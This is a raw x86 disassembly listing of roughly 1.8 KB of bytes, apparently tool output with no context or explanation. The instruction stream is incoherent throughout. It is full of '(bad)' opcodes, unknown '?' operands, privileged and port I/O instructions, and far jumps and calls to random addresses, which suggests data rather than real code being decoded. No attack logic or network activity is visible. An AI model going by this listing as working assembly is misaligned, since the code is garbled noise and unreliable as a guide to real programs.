  414f69:	mov    esp,?
  414f6b:	push   ebp
  414f6c:	push   ss
  414f6d:	inc    ecx
  414f6e:	xor    eax,0xfc16b9fc
  414f73:	jmp    0x414f1a
  414f75:	cmp    eax,0xb2eeef2c
  414f7a:	jmp    0xe1f6:0x10d2e3b2
  414f81:	mov    cl,0x80
  414f83:	xor    ebp,DWORD PTR [ecx+0x24]
  414f86:	pushf  
  414f87:	pop    eax
  414f88:	jl     0x414fa0
  414f8a:	jno    0x414f93
  414f8c:	jecxz  0x414f18
  414f8e:	loopne 0x414fad
  414f90:	mov    esi,0xa8c0cc09
  414f95:	mov    cl,0x0
  414f97:	je     0x414fea
  414f99:	xcrypt-ctr (bad)
  414f9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f9b:	cdq    
  414f9c:	mov    esi,0x9bde0de2
  414fa1:	mov    ah,0x59
  414fa3:	aad    0x27
  414fa5:	fisttp WORD PTR [ecx]
  414fa7:	ja     0x414fbf
  414fa9:	inc    eax
  414faa:	retf   
  414fab:	xchg   edx,eax
  414fac:	cld    
  414fad:	cmp    BYTE PTR [esi-0x7c],bh
  414fb0:	or     ch,cl
  414fb2:	add    al,0x56
  414fb4:	das    
  414fb5:	adc    cl,dh
  414fb7:	loopne 0x41501a
  414fb9:	pop    edx
  414fba:	sub    BYTE PTR [ebp+0x1c636bf9],dh
  414fc0:	rol    DWORD PTR [esi],0xa1
  414fc3:	lods   al,BYTE PTR ds:[esi]
  414fc4:	sub    ah,BYTE PTR [ecx]
  414fc6:	or     BYTE PTR [esi-0x5ba1c671],ch
  414fcc:	sti    
  414fcd:	jnp    0x414fc9
  414fcf:	retf   
  414fd0:	jns    0x41504b
  414fd2:	fld    QWORD PTR [edx+esi*2-0xbf2b601]
  414fd9:	hlt    
  414fda:	outs   dx,DWORD PTR ds:[esi]
  414fdb:	std    
  414fdc:	mov    edx,0x27e2658
  414fe1:	stos   BYTE PTR es:[edi],al
  414fe2:	das    
  414fe3:	out    dx,al
  414fe4:	inc    ebp
  414fe5:	pop    esp
  414fe6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fe7:	test   DWORD PTR [edi+0x779202e6],edi
  414fed:	aad    0xae
  414fef:	and    eax,0x94786009
  414ff4:	mov    esp,0x5c4464ef
  414ff9:	push   es
  414ffa:	es data16 scas al,BYTE PTR es:[edi]
  414ffd:	test   al,0x16
  414fff:	push   ds
  415000:	cmc    
  415001:	or     eax,0xe6424842
  415006:	popa   
  415007:	jae    0x414fb1
  415009:	das    
  41500a:	or     ebx,DWORD PTR [ebx]
  41500c:	ficom  WORD PTR [edi]
  41500e:	cmp    DWORD PTR [ebx],0xffffff98
  415011:	les    esp,FWORD PTR [ebx]
  415013:	xchg   esi,eax
  415014:	stc    
  415015:	jmp    0x415025
  415017:	ss pushf 
  415019:	daa    
  41501a:	shr    BYTE PTR [esi-0x3c],0x9
  41501e:	imul   esi,DWORD PTR [esi+0xbf469d4],0x96f2fe60
  415028:	js     0x41509c
  41502a:	xor    edx,DWORD PTR [edi-0x51]
  41502d:	xchg   ebp,eax
  41502e:	xchg   esi,eax
  41502f:	add    cl,BYTE PTR [ebx+0x6c]
  415032:	mov    cl,0x90
  415034:	adc    esi,0x53
  415037:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415038:	xchg   esp,eax
  415039:	(bad)  
  41503b:	pop    edx
  41503c:	dec    esi
  41503d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41503e:	mov    ebx,0xd547c94d
  415043:	gs gs fcomip st,st(1)
  415047:	sbb    eax,0x1ed27e99
  41504c:	icebp  
  41504d:	pop    es
  41504e:	test   BYTE PTR [eax+0x3770f02c],al
  415054:	lock xor DWORD PTR cs:[ecx*4-0x66823005],esi
  41505d:	in     al,dx
  41505e:	and    DWORD PTR [edx+0x5f],ebx
  415061:	dec    ebx
  415062:	mov    edi,0xee3e8aef
  415067:	jmp    0x4150b4
  415069:	ds enter 0xd088,0xcf
  41506e:	ror    BYTE PTR [esp+ebx*4],0x96
  415072:	jg     0x415081
  415074:	outs   dx,BYTE PTR ds:[esi]
  415075:	pop    es
  415076:	pop    ds
  415077:	mov    cl,0x4d
  415079:	adc    ah,BYTE PTR [ebx-0x1e]
  41507c:	or     eax,DWORD PTR [esp+ecx*4]
  41507f:	dec    edx
  415080:	pop    esp
  415081:	inc    ecx
  415082:	fwait
  415083:	pop    eax
  415084:	out    0xd,eax
  415086:	arpl   di,dx
  415088:	inc    edi
  415089:	shl    ebp,1
  41508b:	test   al,0x6b
  41508d:	arpl   WORD PTR [ebp+0x76],di
  415090:	mov    esp,0xe14f1db5
  415095:	pop    esi
  415096:	xor    al,0x0
  415098:	sti    
  415099:	test   al,0x77
  41509b:	or     BYTE PTR [edx+0x24d09718],0x8d
  4150a2:	into   
  4150a3:	push   eax
  4150a4:	arpl   WORD PTR [edx],ax
  4150a6:	fcomp  QWORD PTR ds:0xd1e68c54
  4150ac:	pop    esi
  4150ad:	mov    ah,BYTE PTR [edx-0x77d2daf8]
  4150b3:	out    0x6,eax
  4150b5:	mov    DWORD PTR [esi+0x71],eax
  4150b8:	rol    edx,cl
  4150ba:	das    
  4150bb:	call   0x1c5e465e
  4150c0:	clc    
  4150c1:	(bad)  
  4150c2:	or     BYTE PTR [esp+eax*8-0x6a],bl
  4150c6:	mov    WORD PTR [ebx-0x798b8bf8],?
  4150cc:	stos   BYTE PTR es:[edi],al
  4150cd:	inc    edi
  4150ce:	stos   BYTE PTR es:[edi],al
  4150cf:	inc    esp
  4150d0:	xchg   ecx,eax
  4150d1:	vmread DWORD PTR [ebp-0x1be40ec],ebx
  4150d8:	xor    ch,BYTE PTR [edi-0x10]
  4150db:	sub    ch,bl
  4150dd:	mov    edx,0xd8add0de
  4150e2:	or     esi,eax
  4150e4:	fwait
  4150e5:	mov    bl,0xe7
  4150e7:	das    
  4150e8:	mov    gs,WORD PTR [edi-0x44b22988]
  4150ee:	mov    ch,0xcb
  4150f0:	imul   eax,DWORD PTR [esi+0x24],0x3444e31e
  4150f7:	xchg   ebx,eax
  4150f8:	ror    DWORD PTR [ecx-0x42c6ac64],0xd1
  4150ff:	dec    esi
  415100:	mov    dh,0xc3
  415102:	std    
  415103:	ficom  WORD PTR [edx+0x3be0bbff]
  415109:	xlat   BYTE PTR ds:[ebx]
  41510a:	mov    eax,0x616bf56a
  41510f:	push   cs
  415110:	sbb    cl,dl
  415112:	clc    
  415113:	xchg   ebx,eax
  415114:	adc    eax,ecx
  415116:	xchg   al,dh
  415118:	pop    ebp
  415119:	arpl   WORD PTR [ebp-0xa91e898],di
  41511f:	sub    eax,0x16225dd
  415124:	mov    ecx,0x4de9faa3
  415129:	mov    ah,0xb5
  41512b:	mov    ebx,0x1b389b57
  415130:	xlat   BYTE PTR ds:[ebx]
  415131:	in     al,0x43
  415133:	sub    al,BYTE PTR [esi]
  415135:	mov    bh,BYTE PTR [eax-0x2122480c]
  41513b:	or     DWORD PTR [ebx+0x1b],0x64
  41513f:	call   DWORD PTR [edi+eax*4+0xc]
  415143:	out    dx,eax
  415144:	cmp    bh,bh
  415146:	sbb    edi,DWORD PTR [eax-0x35]
  415149:	arpl   WORD PTR [eax],si
  41514b:	add    DWORD PTR ds:0x97e9ae53,eax
  415151:	fdivr  QWORD PTR [eax+0xcfdf4bf]
  415157:	(bad)  
  415158:	test   dh,bh
  41515a:	add    al,0x71
  41515c:	mov    esi,0x42627ae
  415161:	ret    0x9c21
  415164:	cdq    
  415165:	jp     0x4151e2
  415167:	sub    DWORD PTR [edi],esi
  415169:	pop    ebp
  41516a:	je     0x4150f2
  41516c:	mov    ch,0x45
  41516e:	lods   al,BYTE PTR ds:[esi]
  41516f:	shr    BYTE PTR [eax],cl
  415171:	add    DWORD PTR [edi-0x6eeb72e0],ebx
  415177:	jmp    0x35cf:0xe71ba29e
  41517e:	jns    0x4151b6
  415180:	hlt    
  415181:	arpl   WORD PTR [ecx-0x8],bx
  415184:	popa   
  415185:	loopne 0x415165
  415187:	cmp    BYTE PTR [ebx+eiz*8-0xe],0x70
  41518c:	std    
  41518d:	retf   0x27bf
  415190:	mov    ch,BYTE PTR [edi-0x2c38daf2]
  415196:	adc    eax,0xeedcd69b
  41519b:	add    bl,BYTE PTR [eax]
  41519d:	out    0xbb,al
  41519f:	mov    ebp,0x279e4474
  4151a4:	jmp    0x99e944c0
  4151a9:	mov    esi,0x924d744f
  4151ae:	mov    ds:0xeec8c75a,eax
  4151b3:	sub    BYTE PTR [eax+edx*2-0x4e],bh
  4151b7:	push   ss
  4151b8:	std    
  4151b9:	add    dh,BYTE PTR [ebp-0x652b1c06]
  4151bf:	loop   0x4151d1
  4151c1:	shl    DWORD PTR [ebx-0x52],0xc
  4151c5:	outs   dx,DWORD PTR ds:[esi]
  4151c6:	fadd   QWORD PTR [edx+esi*8]
  4151c9:	loope  0x415211
  4151cb:	clc    
  4151cc:	leave  
  4151cd:	shr    ch,1
  4151cf:	adc    DWORD PTR [ebx],eax
  4151d1:	xor    DWORD PTR [edi],0xffffff9c
  4151d4:	sub    DWORD PTR [ebx],0x686c91c1
  4151da:	xor    dh,BYTE PTR [esi+esi*1-0x75]
  4151de:	push   eax
  4151df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151e0:	inc    eax
  4151e1:	sbb    dh,dh
  4151e3:	sub    ch,BYTE PTR [ebx-0x6]
  4151e6:	xchg   ebp,eax
  4151e7:	cmp    DWORD PTR [ecx+0x2a],0xffffffce
  4151eb:	popf   
  4151ec:	jmp    0x6ec2:0xd6f3990
  4151f3:	lahf   
  4151f4:	(bad)  
  4151f5:	dec    ebx
  4151f6:	and    bl,al
  4151f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151f9:	rcl    DWORD PTR [edx+0x1c5ab863],cl
  4151ff:	imul   edi,DWORD PTR [ecx],0x1c
  415202:	ror    DWORD PTR [eax+ebp*8-0x71],0x7d
  415207:	pop    ss
  415208:	xchg   DWORD PTR [ecx+0x40084536],esi
  41520e:	test   al,0x6c
  415210:	ror    BYTE PTR [esi],0xde
  415213:	nop
  415214:	cmp    eax,0x657c6a56
  415219:	push   eax
  41521a:	mov    al,BYTE PTR [eax+0x7347fadf]
  415220:	xchg   esi,eax
  415221:	sbb    eax,0xe729e02c
  415226:	add    BYTE PTR [edi+0x30],ah
  415229:	retf   
  41522a:	retf   0x291f
  41522d:	aas    
  41522e:	cmp    BYTE PTR ds:0x9ffa66c7,dl
  415234:	jmp    0xe8e6911d
  415239:	sbb    eax,0x8b9b3723
  41523e:	mov    al,0xf4
  415240:	cdq    
  415241:	ja     0x4151ee
  415243:	jmp    FWORD PTR [esi]
  415245:	call   0x46ccdc3a
  41524a:	mov    ah,0xfa
  41524c:	pop    ebp
  41524d:	call   0xad423f49
  415252:	sub    DWORD PTR [ebx+0x55],ebp
  415255:	(bad)  
  415256:	mov    dl,0x88
  415258:	out    dx,eax
  415259:	push   edi
  41525a:	je     0x415262
  41525c:	xor    eax,0x4514391b
  415261:	cdq    
  415262:	sbb    BYTE PTR [ebx+0x8594141],0xe9
  415269:	scas   al,BYTE PTR es:[edi]
  41526a:	push   ecx
  41526b:	add    esp,DWORD PTR [edx]
  41526d:	repnz stos BYTE PTR es:[edi],al
  41526f:	or     esp,ebx
  415271:	imul   esi,DWORD PTR ss:[edx+0x2c],0xab0da15
  415279:	mov    bl,BYTE PTR [edi]
  41527b:	das    
  41527c:	icebp  
  41527d:	mov    ecx,0x53dd0a3e
  415282:	(bad)  {z}
  415287:	inc    eax
  415288:	inc    edx
  415289:	frstor [edx-0x5f6bcf78]
  41528f:	int    0xb4
  415291:	dec    esp
  415292:	(bad)  
  415293:	into   
  415294:	ds popf 
  415296:	mov    al,ds:0xa25d70c0
  41529b:	cmc    
  41529c:	dec    esi
  41529d:	or     cl,BYTE PTR [ebx]
  41529f:	jmp    0x415301
  4152a1:	enter  0xd6de,0x6f
  4152a5:	add    eax,0x20a45dae
  4152aa:	ror    ch,1
  4152ac:	ds pop edi
  4152ae:	push   edx
  4152af:	push   ecx
  4152b0:	imul   esi,eax,0xeab569ef
  4152b6:	dec    eax
  4152b7:	push   esp
  4152b8:	jmp    0xafd7:0xd17b9a79
  4152bf:	repz pop ss
  4152c1:	call   0xc3a6:0x614e5880
  4152c8:	push   0xc8e6b30a
  4152cd:	and    BYTE PTR [ecx-0x2e39b156],0x1
  4152d4:	pop    esp
  4152d5:	js     0x4152dd
  4152d7:	xchg   edi,eax
  4152d8:	mov    al,0x64
  4152da:	mov    ebp,0x1d8f22a
  4152df:	mov    esi,0x65221af
  4152e4:	test   ah,ah
  4152e6:	mov    eax,ss
  4152e8:	inc    esp
  4152e9:	inc    edi
  4152ea:	sbb    ebp,edi
  4152ec:	addr16 pop es
  4152ee:	jg     0x41528c
  4152f0:	or     DWORD PTR [esi],edx
  4152f2:	mov    edx,0x7214cb9d
  4152f7:	mov    al,ds:0x57509704
  4152fc:	enter  0xfb21,0xb9
  415300:	mov    edi,0xba9186ef
  415305:	adc    al,0xda
  415307:	jge    0x415387
  415309:	sar    DWORD PTR [esi],0x85
  41530c:	outs   dx,DWORD PTR ds:[esi]
  41530d:	call   0x2f8f:0xb920d34b
  415314:	xchg   BYTE PTR [edi+0x7d6a6537],dh
  41531a:	enter  0xfbb0,0x8
  41531e:	push   edi
  41531f:	add    eax,0x656a878
  415324:	or     al,0x86
  415326:	xchg   cl,ch
  415328:	test   dh,dh
  41532a:	cwde   
  41532b:	inc    sp
  41532d:	lock repnz push edi
  415330:	or     esi,DWORD PTR [ebp+0x354f3ec]
  415336:	mov    eax,0xa46cde54
  41533b:	aam    0x2c
  41533d:	and    ebp,DWORD PTR [ecx]
  41533f:	shl    DWORD PTR [edx],cl
  415341:	add    bl,BYTE PTR [edi-0x21]
  415344:	jmp    0xecc26af8
  415349:	cmp    eax,0x107f16e3
  41534e:	scas   al,BYTE PTR es:[di]
  415350:	sbb    DWORD PTR [edi+0x6c],0xfffffff2
  415354:	inc    edi
  415355:	mov    edi,0xb3191e7d
  41535a:	outs   dx,DWORD PTR ds:[esi]
  41535b:	jns    0x4153d9
  41535d:	inc    BYTE PTR [esp+ebp*4+0x60]
  415361:	iret   
  415362:	loop   0x4152fb
  415364:	(bad)  
  415365:	iret   
  415366:	int    0xe8
  415368:	stos   DWORD PTR es:[edi],eax
  415369:	pop    gs
  41536b:	jb     0x41530a
  41536d:	inc    eax
  41536e:	jp     0x415362
  415370:	das    
  415371:	lock sar DWORD PTR [edx],cl
  415374:	loope  0x4153a6
  415376:	mov    esp,0xf8645d12
  41537b:	adc    al,0x9b
  41537d:	int3   
  41537e:	jbe    0x415344
  415380:	imul   esi,DWORD PTR [ecx-0x320558ea],0x56
  415387:	js     0x4153ba
  415389:	jmp    0x1827:0xebefe140
  415390:	mov    ebx,DWORD PTR [ebx+0x29a78131]
  415396:	xor    DWORD PTR [ebp+0x13daaf8a],edx
  41539c:	xchg   DWORD PTR ds:0x270dfc90,esi
  4153a2:	loope  0x4153c4
  4153a4:	mov    ch,0x72
  4153a6:	test   BYTE PTR [eax],0x86
  4153a9:	lahf   
  4153aa:	dec    esi
  4153ab:	mov    edi,0x54d3ddea
  4153b0:	(bad)
  4153b3:	cmp    DWORD PTR [esi],0x65e9b18d
  4153b9:	cmp    eax,ecx
  4153bb:	mov    ?,WORD PTR [eax+esi*8]
  4153be:	xor    DWORD PTR [ecx+0x1b],eax
  4153c1:	adc    eax,0x715920d4
  4153c6:	jle    0x415377
  4153c8:	dec    eax
  4153c9:	add    eax,0x69501888
  4153ce:	retf   
  4153cf:	mov    bl,0xe7
  4153d1:	call   0x2cec2140
  4153d6:	in     al,0xf0
  4153d8:	fwait
  4153d9:	push   cs
  4153da:	(bad)  
  4153db:	adc    eax,0xc320e42f
  4153e0:	add    DWORD PTR [edx],edi
  4153e2:	aam    0x99
  4153e4:	in     al,0x5d
  4153e6:	nop
  4153e7:	add    ebp,DWORD PTR [edx]
  4153e9:	sub    ah,BYTE PTR [ecx+eiz*1]
  4153ec:	stos   DWORD PTR es:[edi],eax
  4153ed:	mov    eax,ds:0x614d97f1
  4153f2:	push   ebp
  4153f3:	pop    ecx
  4153f4:	and    eax,0xf64fd3c4
  4153f9:	sub    al,0x1d
  4153fb:	jge    0x4153f3
  4153fd:	ja     0x41546b
  4153ff:	mov    ?,WORD PTR ss:[ebx+0x628ae7b6]
  415406:	pusha  
  415407:	or     al,0x73
  415409:	sbb    al,BYTE PTR [edx]
  41540b:	test   DWORD PTR [edx+0x0],edi
  41540e:	push   edx
  41540f:	fldenv ds:0x77416459
  415415:	stos   DWORD PTR es:[edi],eax
  415416:	pop    ecx
  415417:	sub    edi,edx
  415419:	ret    
  41541a:	test   DWORD PTR [ebp+0x674aefe3],ebp
  415420:	mov    dl,BYTE PTR [edi]
  415422:	stos   DWORD PTR es:[edi],eax
  415423:	pop    esi
  415424:	pusha  
  415425:	int3   
  415426:	push   0x7e
  415428:	inc    edx
  415429:	dec    esi
  41542a:	xchg   ebx,eax
  41542b:	jmp    0x415416
  41542d:	sub    DWORD PTR [ebp-0x193926f6],eax
  415433:	lods   eax,DWORD PTR ds:[esi]
  415434:	dec    ebx
  415435:	or     edx,ecx
  415437:	rcr    DWORD PTR [eax+0x2f],1
  41543a:	cmp    eax,0x56d41aa3
  41543f:	fs in  eax,0x55
  415442:	or     BYTE PTR [edi+ebx*2-0x5b],cl
  415446:	mov    al,0x84
  415448:	xchg   edi,eax
  415449:	cmp    eax,0xb6b8f28f
  41544e:	mov    edi,0x9da157ee
  415453:	idiv   BYTE PTR [edi-0x4ba0196b]
  415459:	sbb    ebp,ebp
  41545b:	clc    
  41545c:	out    dx,eax
  41545d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41545e:	into   
  41545f:	push   edx
  415460:	and    DWORD PTR [ebp+0x7a],esp
  415463:	std    
  415464:	add    al,0xf7
  415466:	push   ebx
  415467:	sub    BYTE PTR [ecx+0x46],ah
  41546a:	push   0x45
  41546c:	inc    edx
  41546d:	lahf   
  41546e:	into   
  41546f:	or     DWORD PTR [esi-0x3551ec20],ebx
  415475:	pop    ds
  415476:	sahf   
  415477:	cld    
  415478:	(bad)  
  415479:	cmp    dh,BYTE PTR [edi]
  41547b:	add    ecx,DWORD PTR ds:0xc1e53c10
  415481:	cmp    DWORD PTR [edi+0x6d4d07c6],eax
  415487:	sub    BYTE PTR [esi-0x5c61803b],0x7a
  41548e:	fldcw  WORD PTR [esi+edi*1+0x45]
  415492:	fwait
  415493:	or     BYTE PTR [ebx-0x59],ah
  415496:	cmc    
  415497:	ds pop eax
  415499:	mov    dh,0x4b
  41549b:	dec    ecx
  41549c:	mov    ah,0x7c
  41549e:	loope  0x4154d5
  4154a0:	js     0x41546f
  4154a2:	aam    0x8b
  4154a4:	fld    QWORD PTR [eax-0x43]
  4154a7:	dec    ebx
  4154a8:	mov    ah,0x7
  4154aa:	push   eax
  4154ab:	mov    edx,0x54d79dea
  4154b0:	test   DWORD PTR [edx+0x52ee8257],eax
  4154b6:	jns    0x4154b7
  4154b8:	push   ss
  4154b9:	imul   edi,esi,0x67
  4154bc:	hlt    
  4154bd:	into   
  4154be:	outs   dx,BYTE PTR ds:[esi]
  4154bf:	add    edi,ebx
  4154c1:	and    esi,esp
  4154c3:	sbb    BYTE PTR [edi-0x6],0x2f
  4154c7:	(bad)  
  4154c8:	mov    eax,?
  4154ca:	ins    DWORD PTR es:[edi],dx
  4154cb:	clc    
  4154cc:	push   es
  4154cd:	rcl    BYTE PTR [esp+edi*4-0x569deaae],1
  4154d4:	es ret 
  4154d6:	shl    ebp,0xf2
  4154d9:	ja     0x4154e3
  4154db:	fstp   DWORD PTR [edi+0x58ac719b]
  4154e1:	popf   
  4154e2:	dec    eax
  4154e3:	jne    0x4154e2
  4154e5:	and    al,0x5b
  4154e7:	dec    edi
  4154e8:	mov    esi,0x6532ae2c
  4154ed:	adc    ebp,esp
  4154ef:	add    eax,0x5034d2dc
  4154f4:	mov    ecx,0x93ea7803
  4154f9:	inc    esp
  4154fa:	mov    ebx,0x1eb51e73
  4154ff:	icebp  
  415500:	test   DWORD PTR [edi-0x76],0x1bdaddd7
  415507:	xchg   ebx,eax
  415508:	outs   dx,DWORD PTR ds:[esi]
  415509:	push   esi
  41550a:	lock mov ds:0x34ad1dab,eax
  415510:	sub    eax,0xc7e88d66
  415515:	rep lods al,BYTE PTR ds:[esi]
  415517:	pop    ecx
  415518:	sbb    BYTE PTR ds:0xb471162f,bl
  41551e:	fsub   DWORD PTR [edx-0x5b]
  415521:	xor    BYTE PTR [edi-0x43d284d6],ch
  415527:	sbb    dh,BYTE PTR [eax]
  415529:	sub    ecx,0xc8bbe82
  41552f:	inc    esp
  415530:	sub    BYTE PTR [ecx],0x6
  415533:	(bad)  
  415534:	out    0x96,al
  415536:	dec    esp
  415537:	and    al,0xdb
  415539:	test   DWORD PTR [ecx+0x30b3efe7],ebx
  41553f:	or     BYTE PTR [ecx-0x35eb1dc7],0x64
  415546:	pushf  
  415547:	mov    BYTE PTR [edi+0x46],dl
  41554a:	xor    ch,BYTE PTR [ebx+edi*1-0x1c]
  41554e:	js     0x4155c0
  415550:	adc    BYTE PTR [ebp-0x568da7cb],al
  415556:	sub    cl,BYTE PTR [edx-0x16f231db]
  41555c:	or     al,BYTE PTR [edx-0x1561fa95]
  415562:	adc    eax,0x13ad754e
  415567:	arpl   WORD PTR [ebp-0x19],di
  41556a:	push   ebx
  41556b:	mov    ch,0xdd
  41556d:	xor    ah,BYTE PTR [ecx+ecx*8-0xab12bbd]
  415574:	mov    cl,0x31
  415576:	nop
  415577:	dec    esi
  415578:	jp     0x4155ba
  41557a:	and    BYTE PTR [ebx-0x51008259],ah
  415580:	cmp    edx,DWORD PTR [ecx+0x3f]
  415583:	fwait
  415584:	inc    ecx
  415585:	sub    BYTE PTR [esi-0x3374cada],al
  41558b:	push   DWORD PTR [esp+ecx*8-0x4f]
  41558f:	or     dh,BYTE PTR [edx]
  415591:	ficomp WORD PTR [eax-0x4415f4e5]
  415597:	dec    edi
  415598:	mov    bh,0x3e
  41559a:	ins    DWORD PTR es:[edi],dx
  41559b:	mov    eax,0x4c1f7b95
  4155a0:	jl     0x41560f
  4155a2:	fild   WORD PTR [edx+0x51da11e]
  4155a8:	and    BYTE PTR [eax-0x69],dl
  4155ab:	or     DWORD PTR [ebp+0x44],esp
  4155ae:	pop    ebx
  4155af:	xchg   ebx,eax
  4155b0:	sub    eax,0xc24b7241
  4155b5:	pop    esi
  4155b6:	lock lods ax,WORD PTR ds:[esi]
  4155b9:	stos   DWORD PTR es:[edi],eax
  4155ba:	mov    ah,0x12
  4155bc:	xlat   BYTE PTR ds:[ebx]
  4155bd:	add    al,0x32
  4155bf:	jo     0x4155bf
  4155c1:	stc    
  4155c2:	mov    ebx,0x770bc267
  4155c7:	mov    bh,0x89
  4155c9:	outs   dx,BYTE PTR ds:[esi]
  4155ca:	retf   0xceb
  4155cd:	aam    0xeb
  4155cf:	ret    0xed35
  4155d2:	imul   esp,DWORD PTR [edi+0x7b],0x1c797c9e
  4155d9:	adc    eax,0x8f6f1701
  4155de:	mov    ds:0xc8acc575,eax
  4155e3:	lock sti 
  4155e5:	mov    bl,BYTE PTR [eax-0x4b]
  4155e8:	test   DWORD PTR [ecx+0x73],0x19c04892
  4155ef:	les    esp,FWORD PTR [ebx+0x579eb1d6]
  4155f5:	jg     0x415655
  4155f7:	std    
  4155f8:	jne    0x415670
  4155fa:	push   0x2ba9b3f3
  4155ff:	not    BYTE PTR [eax-0x46f42066]
  415605:	test   BYTE PTR [ebp-0x2e],0xc8
  415609:	xor    eax,0xdc211764
  41560e:	add    al,0x42
  415610:	pop    edx
  415611:	lock mov ebp,0xe3049c98
  415617:	lock test eax,0x45d7cc2a
  41561d:	aaa    
  41561e:	icebp  
  41561f:	repnz das 
  415621:	push   eax
  415622:	adc    eax,0xaf904040
  415627:	mov    ch,0xa5
  415629:	sbb    ch,BYTE PTR [ecx]
  41562b:	jmp    0x41568a
  41562d:	and    eax,0xc28ee7f5
  415632:	xchg   edi,eax
  415633:	cmp    BYTE PTR [esi-0x18c51e40],dl
  415639:	pop    ebx
  41563a:	sbb    al,BYTE PTR [ecx+0x6c]
  41563d:	sub    al,0x1b
  41563f:	fnstsw ax
  415641:	ret    0xb703
  415644:	stc    
  415645:	data16 shl cl,0xaa
  415649:	imul   ecx,DWORD PTR [edx],0xee5a589
  41564f:	test   DWORD PTR [esi],0x31e3126e
  415655:	adc    DWORD PTR [edi-0x69],ebp
  415658:	je     0x415631
  41565a:	xchg   ecx,eax
  41565b:	inc    edi
  41565c:	cld    
  41565d:	inc    eax
  41565e:	mov    cl,BYTE PTR [ebx-0x7]
  415661:	jne    0x41566e
  415663:	call   0x6fd0:0x11bd7d49
  41566a:	pop    ecx
  41566b:	pop    esi
  41566c:	pop    eax
  41566d:	xor    eax,0xfccd2dc2
  415672:	sub    ebp,DWORD PTR [edx+0xd]
  415675:	out    0x5c,eax
  415677:	and    BYTE PTR [edi-0x27],0xa
  41567b:	sub    ch,BYTE PTR [esp+eax*8]
  41567e:	stc    
  41567f:	mov    bl,0xb1
  415681:	cmovge edx,DWORD PTR [ebp+0x2b5d0cdc]
  415688:	xchg   esp,eax
  415689:	cwde   
  41568a:	and    ebp,DWORD PTR [ecx+0x2c]
  41568d:	add    BYTE PTR [esi+0x5b],bl
  415690:	(bad)  
  415691:	idiv   BYTE PTR [esp+ebp*1-0x60]
  415695:	test   esp,0x23a32e0f
  41569b:	mov    eax,DWORD PTR [eax-0x1c9cbf0c]
  4156a1:	js     0x41562d
  4156a3:	mov    DWORD PTR [ebx+ecx*1+0x5eb3779b],edx
  4156aa:	sub    esp,ecx
  4156ac:	popa   
  4156ad:	lods   al,BYTE PTR ds:[esi]
  4156ae:	lods   al,BYTE PTR ds:[esi]
  4156af:	ret    
  4156b0:	jp     0x41572c
  4156b2:	fbld   TBYTE PTR [edi+esi*2]
  4156b5:	or     DWORD PTR [edx+0x292a037],esi
  4156bb:	nop
  4156bc:	lods   al,BYTE PTR ds:[esi]
  4156bd:	mov    ah,0xde
  4156bf:	frstor [ebp+0x508d032a]
  4156c5:	jb     0x41566f
  4156c7:	jmp    0xaec:0xa61c8330
  4156ce:	cmp    al,0x5f
  4156d0:	sub    dh,BYTE PTR [edi+0x7e76ac55]
  4156d6:	or     ah,bl
  4156d8:	ror    BYTE PTR [ebx],0x7f
  4156db:	aas    
  4156dc:	sbb    esi,esi
  4156de:	or     BYTE PTR [edi+0x4c],cl
  4156e1:	imul   esi,eax,0xfffffffe
  4156e4:	int    0x84
  4156e6:	xchg   ebp,eax
  4156e7:	mov    ebx,fs
  4156e9:	jb     0x415698
  4156eb:	pop    esi
  4156ec:	or     ah,BYTE PTR [ecx+esi*2]
  4156ef:	jmp    0xd79e3c63
  4156f4:	(bad)  
  4156f5:	push   ecx
  4156f6:	fisub  DWORD PTR [esi-0x3fd8f07]
  4156fc:	sub    eax,0xc04a1688
  415701:	test   DWORD PTR [edx+eax*4-0x75],ebx
  415705:	mov    BYTE PTR [ebx+ebp*8-0x290a89a7],dl
  41570c:	hlt    
  41570d:	inc    edx
  41570e:	popa   
  41570f:	sbb    BYTE PTR [ebp+esi*4-0x1e],0xc1
  415714:	data16 fisubr DWORD PTR [eax+0xe]
  415718:	pop    es
  415719:	mov    ebp,0x83bf96f1
  41571e:	push   ds
  41571f:	gs cld 
  415721:	push   ebp
  415722:	inc    esp
  415723:	jp     0x41575f
  415725:	int    0xb4
  415727:	adc    al,BYTE PTR [edi-0x641622bb]
  41572d:	ret    0xbf77
  415730:	jle    0x415706
  415732:	sahf   
  415733:	fistp  DWORD PTR ss:[ecx-0x1a30aa9b]
  41573a:	adc    esp,ebx
  41573c:	inc    edi
  41573d:	mov    al,ds:0x8efce141
  415742:	add    esi,DWORD PTR [ecx-0x6a]
  415745:	out    dx,al
  415746:	(bad)  
  415747:	call   0x995b07c8
  41574c:	ds fwait
  41574e:	push   DWORD PTR [edi]
  415750:	cmp    ecx,DWORD PTR [edi]
  415752:	cmp    eax,0xc3a80a07
  415757:	std    
  415758:	cld    
  415759:	adc    esp,eax
  41575b:	pop    ds
  41575c:	je     0x4157c6
  41575e:	jb     0x4156e5
  415760:	loopne 0x41579b
  415762:	xor    eax,0x51b418b2
  415767:	adc    cl,BYTE PTR [ecx+0x41]
  41576a:	inc    ebp
  41576b:	test   al,0xd1
  41576d:	pop    ebx
  41576e:	jnp    0x4157c7
  415770:	mov    dl,0xf6
  415772:	rol    ah,cl
  415774:	mov    al,ds:0x56e0de35
  415779:	pop    ebx
  41577a:	leave  
  41577b:	jl     0x4157e8
  41577d:	(bad)  
  41577e:	and    al,BYTE PTR [eax]
  415780:	add    ecx,DWORD PTR [ebx+0x4f]
  415783:	push   edx
  415784:	ds xor al,0xbe
  415787:	scas   eax,DWORD PTR es:[edi]
  415788:	mov    esp,0x9bef003a
  41578d:	add    ebp,DWORD PTR [ebp+0x32088dc0]
  415793:	gs (bad) 
  415795:	cwde   
  415796:	cmp    BYTE PTR ds:0x6e002535,ch
  41579c:	jbe    0x415770
  41579e:	out    0x0,eax
  4157a0:	inc    esi
  4157a1:	leave  
  4157a2:	div    DWORD PTR [ebx-0x42]
  4157a5:	test   al,0x5
  4157a7:	add    BYTE PTR [edx-0x23],0xfc
  4157ab:	mov    ds:0xdf55b3d4,al
  4157b0:	sahf   
  4157b1:	mov    bl,BYTE PTR [esi]
  4157b3:	rcl    ch,1
  4157b5:	sub    ebx,DWORD PTR [ebx-0x6f8c864]
